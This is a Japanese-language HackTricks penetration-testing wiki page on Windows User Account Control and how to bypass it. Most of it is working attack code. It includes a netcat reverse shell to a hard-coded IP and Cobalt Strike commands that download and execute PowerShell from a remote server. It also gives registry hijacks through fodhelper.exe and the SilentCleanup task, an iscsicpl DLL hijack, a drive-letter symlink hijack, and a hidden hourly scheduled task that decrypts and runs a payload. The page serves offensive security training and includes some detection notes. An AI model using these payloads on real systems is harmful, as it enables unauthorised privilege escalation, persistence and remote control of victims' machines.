# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、**昇格されたアクティビティに対する同意プロンプト**を有効にする機能です。アプリケーションには異なる `integrity` レベルがあり、**高いレベル**のプログラムは、**システムを侵害する可能性のあるタスク**を実行できます。UAC が有効な場合、管理者がこれらのアプリケーションやタスクによるシステムへの管理者レベルのアクセスを明示的に許可しない限り、アプリケーションとタスクは常に**非管理者アカウントのセキュリティコンテキストで実行**されます。これは管理者を意図しない変更から保護する利便性機能ですが、セキュリティ境界とは見なされません。<sup>[[2]](#references)</sup>

integrity レベルの詳細については、以下を参照してください。


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC が導入されている場合、管理者ユーザーには 2 つの token が付与されます。1 つは通常の操作を medium integrity で実行するための標準ユーザー token で、もう 1 つは admin privileges を持つ token です。

この [ページ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)では、logon プロセス、ユーザーエクスペリエンス、UAC アーキテクチャを含め、UAC の仕組みが詳しく説明されています。<sup>[[2]](#references)</sup> 管理者は security policies を使用して、組織に合わせた UAC の動作をローカルレベル（secpol.msc を使用）で構成したり、Active Directory ドメイン環境で Group Policy Objects (GPO) を介して構成および配布したりできます。各種設定については、[こちら](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)で詳しく説明されています。UAC には設定可能な Group Policy settings が 10 個あります。以下の表に詳細を示します。

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (無効)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (secure desktop 上で Windows 以外の binary に対する同意を求める) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (secure desktop 上で credentials を要求)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (有効; Enterprise ではデフォルトで無効)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (無効)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (有効)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (有効)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (無効)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (有効)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (有効)                                              |

### Windows で software をインストールするための policies

**local security policies**（ほとんどのシステムでは "secpol.msc"）は、デフォルトで**非 admin ユーザーによる software のインストールを防止する**ように構成されています。つまり、非 admin ユーザーが software の installer をダウンロードできたとしても、admin account なしでは実行できません。

### UAC に elevation を要求させるための Registry Keys

admin rights を持たない標準ユーザーとして、特定の操作を実行しようとした際に「標準」account が **UAC によって credentials を要求される**ようにできます。この操作には特定の **registry keys** の変更が必要であり、そのためには admin permissions が必要です。ただし、**UAC bypass** が存在する場合や、攻撃者がすでに admin として log in している場合は除きます。

ユーザーが **Administrators** group に所属している場合でも、これらの変更によって、administrative actions を実行するためにユーザーは**account credentials を再入力**する必要があります。

**実際には、すでに elevated token、UAC bypass、またはこれらの keys を変更できる misconfiguration が存在する場合にのみ有用です。それ以外の場合、registry write 自体がブロックされます。**

変更する必要がある registry keys と entries は以下のとおりです（括弧内はデフォルト値）。

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

これは Local Security Policy tool から手動で行うこともできます。変更後、administrative operations を実行すると、ユーザーに credentials の再入力が求められます。

### Note

**User Account Control は security boundary ではありません。** したがって、standard users は local privilege escalation exploit なしに account から抜け出して admin rights を取得することはできません。

### ユーザーに「full computer access」を要求する
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode は、integrity check を使用して、高い integrity level のプロセス（web browser など）が低い integrity level のデータ（一時 Internet ファイル folder など）にアクセスするのを防ぎます。これは、browser を low-integrity token で実行することで行われます。browser が low-integrity zone に保存されたデータへアクセスしようとすると、operating system はプロセスの integrity level を確認し、それに応じてアクセスを許可します。この機能は、remote code execution 攻撃が system 上の機密データへアクセスするのを防ぐのに役立ちます。
- user が Windows に log on すると、system は user の privileges の一覧を含む access token を作成します。Privileges は、user の rights と capabilities を組み合わせたものとして定義されます。token には user の credentials の一覧も含まれます。これらの credentials は、computer および network 上の resources に対して user を authenticate するために使用されます。

### Autoadminlogon

Windows が startup 時に特定の user へ自動的に log on するよう設定するには、**`AutoAdminLogon` registry key** を設定します。これは kiosk 環境や testing 目的に便利です。ただし、registry に password が露出するため、安全な system でのみ使用してください。

Registry Editor または `reg add` を使用して、以下の key を設定します。

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

通常の logon 動作に戻すには、`AutoAdminLogon` を 0 に設定します。

## UAC bypass

> [!TIP]
> victim に graphical access がある場合、UAC bypass は簡単です。UAC prompt が表示されたときに "Yes" をクリックするだけでよいためです。

UAC bypass が必要になるのは、次の状況です。**UAC が有効化されており、process が medium integrity context で実行され、user が administrators group に所属している場合です。**

UAC が最高の security level（Always）に設定されている場合は、他の level（Default）に設定されている場合よりも **UAC の bypass がはるかに困難** である点に注意してください。

### Fast triage from a medium-integrity shell

bypass を試す前に、適切な scenario にいることを確認し、host build を既知の動作する method に対応付けます。
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
実践的な注意事項:
- `EnableLUA=0` の場合、bypass は不要です。任意の admin token から、直接 high integrity を要求できます。
- `ConsentPromptBehaviorAdmin=2` または `5` は、auto-elevate / COM-based bypasses における一般的なシナリオです。
- `Always Notify` はハードルを上げますが、失敗すると決めつけず、対象の正確な build でテストすべきです。UACME は、最新の Windows build でも一部の `AlwaysNotify compatible` methods を追跡しています。<sup>[[3]](#references)</sup>

### UAC が無効な場合

UAC がすでに無効（`ConsentPromptBehaviorAdmin` が **`0`**）になっている場合は、次のような方法で **admin privileges を持つ reverse shell**（high integrity level）を実行できます。
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Very** Basic UAC「bypass」（完全なファイルシステムアクセス）

Administrators グループに所属するユーザーの shell を取得している場合、SMB（ファイルシステム）経由で共有されている **C$** を新しいディスクとしてローカルに mount できます。これにより、**ファイルシステム内のすべてにアクセス**できます（Administrator の home folder も含む）。

> [!WARNING]
> **この手法は現在、機能しないようです**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Cobalt Strikeを使用したUAC bypass

Cobalt Strikeのtechniqueは、UACが最大セキュリティレベルに設定されていない場合にのみ機能します
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** と **Metasploit** には、**UAC** を **bypass** するためのモジュールも複数あります。

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM objects は、現行の build でも実用的な UAC attack surface として残っています。`ICMLuaUtil` は、現在の Windows ブランチでも動作するものとして UACME で引き続き追跡されており、offensive tooling は、COM Elevation Moniker を呼び出す前に、interactive desktop process、64-bit execution、場合によっては PEB/process masquerading を組み合わせて `CMSTPLUA` を適応させ続けています。<sup>[[3]](#references)</sup>

実践的な tips:
- ユーザーの **interactive session** 内にある **64-bit** process（一般的には `explorer.exe` またはその child）を優先してください。
- raw shell が失敗した場合は、単純な `CreateProcess` wrapper ではなく、BOF / UACME implementation から再試行してください。
- child execution は、**separate elevated process** で実行されることを想定してください。多くの BOF は現在の beacon をその場で elevate しません。

### KRBUACBypass

[https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) に documentation と tool があります。

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) は、複数の UAC bypass exploits をまとめた **compilation** です。**visual studio または msbuild を使用して UACME を compile** する必要があることに注意してください。compilation によって複数の executable（`Source\Akagi\outout\x64\Debug\Akagi.exe` など）が作成されるため、**必要なものがどれかを把握する必要があります。**<sup>[[3]](#references)</sup>\
一部の bypass は、何かが起きていることを **user** に **alert** するため、他の program を **prompt** することがあるので、**注意してください**。<sup>[[3]](#references)</sup>

UACME には、各 technique が動作し始めた **build version** が記載されています。<sup>[[3]](#references)</sup> 自分の version に影響する technique を検索できます。
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
また、[このページ](https://en.wikipedia.org/wiki/Windows_10_version_history)を使用すると、build versionからWindows release `1607`を取得できます。

実用的なworkflowでは、まず**host buildを評価**し、その後で対応するmethodを実行します：
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` はローカルの build を既知の UAC methods と迅速に比較できるため、使えなくなった PoC を早期に除外するのに役立ちます。<sup>[[4]](#references)</sup>
- `UACME` は、bypass を正確な build に対応付けるための、現在も最良の public catalogue です。最近の releases では新しい methods が追加され、既存の methods も **Windows 11 25H2** に対して再テストされています。そのため、古い blog post が現在も変更なく適用できると判断する前に、README/release notes を再確認してください。<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

信頼された binary である `fodhelper.exe` は、modern Windows では auto-elevated されます。起動時に、`DelegateExecute` verb を検証せずに、以下の per-user registry path をクエリします。そこに command を配置すると、Medium Integrity process（user が Administrators に所属）が、UAC prompt なしで High Integrity process を spawn できます。

Registry path queried by fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell steps（payloadを設定してからtrigger）</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
注記:
- 現在のユーザーが Administrators のメンバーで、UAC level が default/lenient の場合に動作します（追加の制限がある Always Notify では動作しません）。
- 64-bit Windows 上で 32-bit process から 64-bit PowerShell を起動するには、`sysnative` path を使用します。
- Payload には任意の command（PowerShell、cmd、または EXE path）を指定できます。stealth のため、UI の prompt は避けてください。

#### CurVer/extension hijack variant（HKCU only）

最近の `fodhelper.exe` を悪用するサンプルでは、`DelegateExecute` を使用せず、ユーザー単位の `CurVer` value を介して **`ms-settings` ProgID を redirect** します。auto-elevated binary は引き続き `HKCU` 下で handler を解決するため、keys の配置に admin token は必要ありません:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
権限昇格後、マルウェアは通常、`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` を `0` に設定して**今後のプロンプトを無効化**し、その後、追加の defense evasion（例: `Add-MpPreference -ExclusionPath C:\ProgramData`）を実行して、high integrity で実行されるよう persistence を再作成します。典型的な persistence task では、**XOR-encrypted PowerShell script** をディスク上に保存し、1時間ごとにメモリ上で復号して実行します。<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
この variant でも dropper をクリーンアップし、staged payloads だけを残すため、検出は **`CurVer` hijack**、`ConsentPromptBehaviorAdmin` の tampering、Defender exclusion の作成、またはメモリ内で PowerShell を復号する scheduled tasks の監視に依存することになります。<sup>[[5]](#references)</sup>

### `SilentCleanup` task による UAC bypass（`HKCU\Environment\windir`）

`SilentCleanup` は `cleanmgr.exe` を最高権限で起動し、ユーザー環境変数から `%windir%` を展開します。`HKCU\Environment\windir` を制御できる場合、その展開先を任意の command にリダイレクトし、consent dialog なしで high integrity を取得できます。<sup>[[8]](#references)</sup> UACME がこの technique を引き続き有効にしており、recent issue tracking では Windows 11 24H2 で必要なのは小さな quoting 調整だけである可能性が示されているため、recent builds でもこの方法をテストする価値があります。<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
その build でタスクがパスを引用する場合は、末尾に引用符を付けた payload（例: `cmd.exe"`）で再試行してください。テスト後は必ず `HKCU\Environment\windir` をクリーンアップしてください。

#### More UAC bypass

UI フロー、COM オブジェクト、またはデスクトップ操作を悪用する従来の UAC bypass の多くは、被害者の**完全なインタラクティブセッション**を必要とします。一般的な `nc.exe` shell や **Session 0** で実行されている service だけでは、多くの場合不十分です。

通常は **meterpreter** session を使用して解決できます。**Session** の値が **1** に等しい **process** へ migrate してください:

![ms-settings をカスタム拡張子 (.thm) に指定し、その拡張子を payload にマッピングする - More UAC bypass: meterpreter session を使用できます。Session... がある process へ Migrate します...](<../../images/image (863).png>)

(_explorer.exe_ should works)

### UAC Bypass with GUI

**GUI にアクセスできる場合、UAC prompt が表示されたときにそのまま承認できます**。実際には技術的な bypass は必要ありません。そのため、GUI session を取得するだけで、UAC による実際上の障害を回避できることがよくあります。

さらに、誰かが使用していた GUI session（RDP 経由の可能性があります）を取得した場合、**administrator として実行されているツールが存在することがあります**。そこから、[**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif) のように、UAC による再度の prompt なしで、たとえば **cmd** を直接 **admin として実行**できます。これはより **stealthy** である可能性があります。

### Noisy brute-force UAC bypass

ノイズを気にしないのであれば、[**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) のようなものを**実行**して、**ユーザーが承認するまで権限昇格を要求し続ける**こともできます。

### Your own bypass - Basic UAC bypass methodology

**UACME** を見ると、**多くの UAC bypass が DLL hijacking を悪用している**ことが分かります（多くの場合、elevated binary に writable path から attacker-controlled DLL を load させます）。[DLL hijacking vulnerability の見つけ方については、こちらを読んでください](../windows-local-privilege-escalation/dll-hijacking/index.html)。

1. **autoelevate** する binary を見つけます（実行時に high integrity level で動作することを確認します）。
2. procmon を使用して、**DLL Hijacking** に対して脆弱な可能性がある "**NAME NOT FOUND**" event を見つけます。
3. DLL を、書き込み権限のない**保護された path**（C:\Windows\System32 など）に**書き込む**必要がある可能性があります。以下を使用して bypass できます:
1. **wusa.exe**: Windows 7、8、8.1。high integrity level で実行される tool であるため、CAB file の内容を保護された path 内に extract できます。
2. **IFileOperation**: Windows 10。
4. DLL を保護された path に copy し、脆弱な autoelevated binary を実行する**script**を準備します。

### Another UAC bypass technique

**autoElevated binary** が、実行する**binary**または**command**の**name/path**を **registry** から**read** しようとするかを監視します（binary がこの情報を **HKCU** 内で検索する場合は、さらに興味深い方法です）。

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

32-bit の `C:\Windows\SysWOW64\iscsicpl.exe` は、search order によって `iscsiexe.dll` を load させるために悪用できる **auto-elevated** binary です。悪意のある `iscsiexe.dll` を **user-writable** folder 内に配置し、現在の user の `PATH`（たとえば `HKCU\Environment\Path` 経由）を変更してその folder が検索されるようにできれば、Windows は UAC prompt を表示せずに、elevated な `iscsicpl.exe` process 内へ attacker DLL を load する可能性があります。<sup>[[1]](#references)[[6]](#references)</sup>

実用上の注意:
- これは、現在の user が **Administrators** に所属しているものの、UAC により **Medium Integrity** で実行されている場合に役立ちます。
- この bypass で関連するのは **SysWOW64** の copy です。**System32** の copy は別の binary として扱い、動作を個別に検証してください。
- この primitive は **auto-elevation** と **DLL search-order hijacking** の組み合わせです。そのため、他の UAC bypass で使用するものと同じ ProcMon workflow が、missing DLL load の検証に役立ちます。

最小限の flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
検知のアイデア:
- `reg add` / `HKCU\Environment\Path` へのレジストリ書き込みの直後に `C:\Windows\SysWOW64\iscsicpl.exe` が実行された場合にアラートする。
- `%TEMP%` や `%LOCALAPPDATA%\Microsoft\WindowsApps` など、**ユーザーが制御可能な**場所にある `iscsiexe.dll` をハントする。
- `iscsicpl.exe` の起動と、通常の Windows ディレクトリ外からの予期しない子プロセスや DLL ロードを相関分析する。

### 個別に確認する価値のある新しい研究

2024年以降の一部の chain は、従来の `HKCU\Software\Classes` レジストリ hijack とは異なる挙動を示します。例えば、activation-context cache poisoning により、**drive remap** と **DLL redirection** を chain し、`ctfmon.exe` や後続の `fodhelper.exe` など、信頼された UI / auto-elevated binary を介して medium integrity から high integrity へ移行できます。ここで大規模な PoC を重複して掲載する代わりに、以下にある簡潔な payload 例を確認してください。

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (25H2) の per-logon-session DOS device map を介した drive-letter hijack

Windows 11 25H2 における完全な `RAiLaunchAdminProcess` / UIAccess attack surface については、専用ページを確認してください。

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 の「Administrator Protection」は、per-session `\Sessions\0\DosDevices/<LUID>` map を持つ shadow-admin token を使用します。このディレクトリは、最初の `\??` resolution 時に `SeGetTokenDeviceMap` によって遅延作成されます。攻撃者が shadow-admin token を **SecurityIdentification** でのみ impersonate すると、攻撃者が **owner** となってディレクトリが作成されます（`CREATOR OWNER` を継承）。これにより、` \GLOBAL??` よりも優先される drive-letter link が可能になります。<sup>[[7]](#references)</sup>

**手順:**

1. low-privileged session から `RAiProcessRunOnce` を呼び出し、promptless な shadow-admin `runonce.exe` を spawn する。
2. その primary token を **identification** token に duplicate し、`\??` を開く間 impersonate して、` \Sessions\0\DosDevices/<LUID>` を攻撃者所有として強制的に作成する。
3. そこに攻撃者が制御する storage を指す `C:` symlink を作成する。その session 内の後続の filesystem access では `C:` が攻撃者の path に resolve され、prompt なしで DLL/file hijack が可能になる。

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## 参考資料

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – User Account Control の仕組み](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC bypass compatibility scanner and launcher](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: 東南アジア政府の標的に対する 0-Day Exploitation](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Windows Administrator Protection の bypass](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – SilentCleanup Task を使用した UAC bypass](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
